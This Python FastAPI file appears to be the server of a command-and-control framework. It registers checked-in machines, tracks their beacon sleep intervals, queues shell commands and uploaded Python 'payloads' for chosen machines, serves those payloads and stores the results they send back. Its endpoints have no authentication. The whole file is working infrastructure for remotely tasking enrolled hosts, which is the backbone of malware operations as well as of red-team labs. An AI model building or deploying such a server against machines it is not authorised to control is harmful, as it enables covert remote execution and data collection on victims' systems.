from typing import Dict, List, Optional
import os
import uuid
from tinydb import TinyDB, Query
from pydantic import BaseModel
import time

from fastapi import FastAPI
from fastapi.middleware.cors import CORSMiddleware

app = FastAPI()

# Enable CORS for local development (frontend running on localhost:3000)
app.add_middleware(
    CORSMiddleware,
    allow_origins=["http://localhost:3000", "http://127.0.0.1:3000"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# set of raw machine IDs (strings reported by clients)
checked_in_clients: set = set()
# tasks per raw machine_id
tasks_store: Dict[str, List[dict]] = {}
# mapping short numeric IDs (string) -> machine_id
machines_map: Dict[str, str] = {}
# per-client status info (raw machine_id -> status dict)
# status fields: last_seen (float timestamp), sleeping_until (float timestamp or None)
clients_status: Dict[str, Dict[str, Optional[float]]] = {}
# results per machine (machine_id -> list of result dicts)
results_store: Dict[str, List[dict]] = {}

# ensure data dir exists and open a TinyDB database for persistent results
DB_PATH = os.path.join(os.path.dirname(__file__), "data")
os.makedirs(DB_PATH, exist_ok=True)
DB_FILE = os.path.join(DB_PATH, "db.json")
db = TinyDB(DB_FILE)
results_table = db.table("results")
payloads_table = db.table("payloads")

# ensure payloads directory for serving files
PAYLOADS_PATH = os.path.join(os.path.dirname(__file__), "payloads")
os.makedirs(PAYLOADS_PATH, exist_ok=True)


@app.get("/")
def read_root():
    return {"Hello": "World"}


@app.post("/checkin")
def check_in(machine_id: str):
    """Register a reported machine_id (idempotent)."""
    if machine_id in checked_in_clients:
        # if already checked in, return existing short id if assigned
        for sid, mid in machines_map.items():
            if mid == machine_id:
                return {"status": "already checked in", "machine_id": machine_id, "short_id": sid}
        return {"status": "already checked in", "machine_id": machine_id}
    checked_in_clients.add(machine_id)
    # ensure status entry exists and update last_seen
    clients_status.setdefault(machine_id, {})
    clients_status[machine_id]["last_seen"] = time.time()
    # clear sleeping_until when a client explicitly checks in
    clients_status[machine_id]["sleeping_until"] = None
    # auto-assign a short numeric id if one isn't already mapped
    if machine_id not in machines_map.values():
        n = 1
        while str(n) in machines_map:
            n += 1
        machines_map[str(n)] = machine_id
        return {"status": "checked in", "machine_id": machine_id, "short_id": str(n)}
    # if we reach here, the machine_id was already mapped (rare path)
    for sid, mid in machines_map.items():
        if mid == machine_id:
            return {"status": "checked in", "machine_id": machine_id, "short_id": sid}
    return {"status": "checked in", "machine_id": machine_id}


@app.post("/checkout")
def check_out(machine_id: str):
    """Unregister a checked-in client (best-effort)."""
    if machine_id in checked_in_clients:
        checked_in_clients.remove(machine_id)
        # also remove any mapping that points to this machine
        for sid, mid in list(machines_map.items()):
            if mid == machine_id:
                del machines_map[sid]
        # update status to indicate offline
        clients_status.setdefault(machine_id, {})
        clients_status[machine_id]["last_seen"] = time.time()
        clients_status[machine_id]["sleeping_until"] = None
        return {"status": "checked out", "machine_id": machine_id}
    return {"status": "not found", "machine_id": machine_id}


@app.get("/machines")
def list_machines():
    """Return list of raw machine IDs currently checked in."""
    return {"machines": list(checked_in_clients)}


@app.post("/status_update")
def status_update(machine_id: str, sleeping_for: Optional[float] = None):
    """Client reports its upcoming sleep interval or heartbeat.

    - if sleeping_for provided, server records sleeping_until = now + sleeping_for
    - always updates last_seen
    """
    now = time.time()
    if machine_id not in checked_in_clients:
        # If a client reports status but hasn't checked in explicitly, add it
        checked_in_clients.add(machine_id)
    clients_status.setdefault(machine_id, {})
    clients_status[machine_id]["last_seen"] = now
    if sleeping_for is not None:
        try:
            sf = float(sleeping_for)
            clients_status[machine_id]["sleeping_until"] = now + sf
        except Exception:
            clients_status[machine_id]["sleeping_until"] = None
    else:
        # clear sleeping_until if not provided
        clients_status[machine_id]["sleeping_until"] = None

    # mark if there are any pending tasks for convenience
    clients_status[machine_id]["has_task"] = bool(tasks_store.get(machine_id))

    return {"status": "updated", "machine_id": machine_id, "status_info": clients_status[machine_id]}


@app.get("/clients_status")
def get_clients_status():
    """Return the mapping of raw machine_id -> status info (last_seen, sleeping_until, has_task)."""
    # generate a shallow copy with JSON-friendly values
    now = time.time()
    out = {}
    for m, s in clients_status.items():
        last_seen = s.get("last_seen")
        sleeping_until = s.get("sleeping_until")
        has_task = s.get("has_task", False) or bool(tasks_store.get(m))
        # expose seconds until wake if sleeping_until is present
        secs_until = None
        if sleeping_until is not None and sleeping_until > now:
            secs_until = int(sleeping_until - now)
        out[m] = {"last_seen": last_seen, "sleeping_until": sleeping_until, "secs_until": secs_until, "has_task": has_task}
    return {"clients_status": out}


@app.get("/mapped")
def list_mapped():
    """Return the short-ID -> machine_id mapping."""
    return {"mapping": machines_map}


@app.post("/assign_id")
def assign_id(machine_id: str, short_id: Optional[str] = None):
    """Assign a short numeric id to a machine. If short_id is omitted, auto-pick the next available integer."""
    if machine_id not in checked_in_clients:
        return {"status": "machine not checked in", "machine_id": machine_id}
    if short_id is None:
        # pick next available positive integer starting at 1
        n = 1
        while str(n) in machines_map:
            n += 1
        short_id = str(n)
    else:
        short_id = str(short_id)
        # ensure short_id not already used for a different machine
        if short_id in machines_map and machines_map[short_id] != machine_id:
            return {"status": "short_id_conflict", "short_id": short_id}
    machines_map[short_id] = machine_id
    return {"status": "assigned", "short_id": short_id, "machine_id": machine_id}


def _resolve_target(machine_id: Optional[str], short_id: Optional[str]) -> Optional[str]:
    """Resolve provided machine_id or short_id to a raw machine_id string. Returns None if not found."""
    if machine_id:
        return machine_id
    if short_id:
        return machines_map.get(str(short_id))
    return None


@app.post("/addtask")
def add_task(task_id: str, task_type: str, machine_id: Optional[str] = None, short_id: Optional[str] = None, command: str = None, script: str = None):
    """Add a task (CMD or SCRIPT) for a machine referenced either by `machine_id` or `short_id`."""
    target = _resolve_target(machine_id, short_id)
    if not target:
        return {"status": "target_not_found", "machine_id": machine_id, "short_id": short_id}
    t = {"task_id": task_id, "type": task_type.upper()}
    if task_type.upper() == "CMD":
        t["command"] = command or ""
    elif task_type.upper() in ("PY", "PAYLOAD"):
        # payload_name expected in `command` parameter (legacy reuse), or script param
        payload_name = command or script or None
        t["payload_name"] = payload_name or ""
    else:
        t["script"] = script or ""
    tasks_store.setdefault(target, []).append(t)
    return {"status": "task added", "task": t}


class UploadPayload(BaseModel):
    file_name: str
    content: str


@app.post("/upload_payload")
def upload_payload(payload: UploadPayload):
    """Upload a payload (Python file) to server storage and register in DB.

    Stores file under ./payloads/<file_name> and records metadata in TinyDB table 'payloads'.
    """
    # sanitize file name a bit
    safe_name = os.path.basename(payload.file_name)
    if not safe_name.endswith(".py"):
        # enforce python suffix
        safe_name = safe_name + ".py"
    path = os.path.join(PAYLOADS_PATH, safe_name)
    with open(path, "w", encoding="utf-8") as f:
        f.write(payload.content)

    rec = {"id": str(uuid.uuid4()), "file_name": safe_name, "path": path, "timestamp": time.time()}
    payloads_table.insert(rec)

    return {"status": "uploaded", "payload": rec}


@app.get("/payloads")
def list_payloads():
    """Return list of registered payloads."""
    return {"payloads": payloads_table.all()}


@app.get("/payload")
def get_payload(file_name: str):
    """Return content of the payload by file_name (exact base name)."""
    safe_name = os.path.basename(file_name)
    path = os.path.join(PAYLOADS_PATH, safe_name)
    if not os.path.exists(path):
        return {"content": None}
    with open(path, "r", encoding="utf-8") as f:
        return {"content": f.read(), "file_name": safe_name}


@app.get("/tasks")
def get_tasks(machine_id: Optional[str] = None, short_id: Optional[str] = None):
    """Return pending tasks for a machine (by raw machine_id or short_id)."""
    target = _resolve_target(machine_id, short_id)
    if not target:
        return {"tasks": []}
    tasks = tasks_store.get(target, [])
    # Suggest a client-side sleep interval — shorter when there are tasks, longer when idle.
    # This helps reduce client polling frequency for large fleets.
    if tasks:
        recommended_sleep = 5
    else:
        # When no tasks are available, recommend a longer sleep so clients back off
        recommended_sleep = 60
    return {"tasks": tasks, "recommended_sleep": recommended_sleep}


@app.get("/tasks_count")
def tasks_count():
    """Return a lightweight total number of pending tasks across all machines.

    This avoids the UI making an individual /tasks call per machine when all we
    need is a single numeric count for the dashboard.
    """
    total = 0
    for lst in tasks_store.values():
        total += len(lst or [])
    return {"count": total}


class SubmitResult(BaseModel):
    task_id: str
    result: str
    machine_id: Optional[str] = None
    short_id: Optional[str] = None


@app.post("/submittask")
def submit_task(payload: SubmitResult):
    """Accept a finished task result in the request body and remove the task from the queue.

    Stores the result in-memory (results_store) so controllers can retrieve it later.
    """
    task_id = payload.task_id
    result = payload.result
    machine_id = payload.machine_id
    short_id = payload.short_id

    target = _resolve_target(machine_id, short_id)
    if not target:
        return {"status": "target_not_found", "task_id": task_id}

    removed = False
    tasks = tasks_store.get(target, [])
    for t in list(tasks):
        if t.get("task_id") == task_id:
            tasks.remove(t)
            removed = True

    # store result persistently and in-memory for convenience
    rec = {"id": str(uuid.uuid4()), "task_id": task_id, "result": result, "machine_id": target, "timestamp": time.time()}
    results_table.insert(rec)
    results_store.setdefault(target, []).append(rec)

    if removed:
        return {"status": "task submitted and removed", "task_id": task_id, "stored": True}
    return {"status": "task submitted (was not in queue)", "task_id": task_id, "stored": True}


@app.get("/results")
def get_results(machine_id: Optional[str] = None, short_id: Optional[str] = None):
    """Return stored results for a machine (by raw machine_id or short_id)."""
    target = _resolve_target(machine_id, short_id)
    if not target:
        return {"results": []}
    # try to read from TinyDB table for persistence
    q = Query()
    found = results_table.search(q.machine_id == target)
    # merge any in-memory results that might not yet be in TinyDB (unlikely)
    mem = results_store.get(target, [])
    # avoid duplicates by id (prefers DB records)
    all_ids = {r.get("id") for r in found}
    merged = found + [r for r in mem if r.get("id") not in all_ids]
    return {"results": merged}


@app.get("/result")
def get_result(id: str):
    """Fetch a single stored result by its unique id."""
    q = Query()
    found = results_table.search(q.id == id)
    if not found:
        return {"result": None}
    return {"result": found[0]}


@app.get("/results_all")
def get_results_all():
    """Return all stored results from DB."""
    return {"results": results_table.all()}


@app.get("/db_stats")
def db_stats():
    """Return lightweight statistics about the tinydb results table."""
    count = len(results_table)
    return {"count": count, "db_file": DB_FILE}


@app.delete("/result")
def delete_result(id: str):
    """Delete a stored result by id from TinyDB and in-memory store."""
    q = Query()
    found = results_table.search(q.id == id)
    if not found:
        return {"deleted": False, "reason": "not_found"}
    # remove from TinyDB
    results_table.remove(q.id == id)
    # also remove from in-memory results_store
    for k, lst in list(results_store.items()):
        results_store[k] = [r for r in lst if r.get("id") != id]
        if not results_store[k]:
            del results_store[k]
    return {"deleted": True, "id": id}